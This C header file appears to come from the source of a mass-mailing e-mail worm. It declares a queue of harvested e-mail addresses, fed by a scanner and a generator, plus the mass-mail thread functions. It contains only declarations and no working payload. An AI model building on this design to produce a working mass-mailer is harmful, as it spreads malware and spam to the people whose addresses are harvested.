#ifndef _SYNC_MASSMAIL_H_
#define _SYNC_MASSMAIL_H_

/* Queue of found e-mail addresses */
#pragma pack(push, 1)
struct mailq_t {
	struct mailq_t *next;
	unsigned long tick_got;
	char state;		/* 0=not processed yet, 1=processing, 2=processed */
	char priority;		/* 0=normal (from scanner), 1=lower (from generator) */
	char to[1];		/* variable-length */
};
#pragma pack(pop)

extern struct mailq_t * volatile massmail_queue;

int massmail_addq(const char *email, int prior);

void massmail_init(void);
void massmail_main(void);
DWORD _stdcall massmail_main_th(LPVOID);

#endif
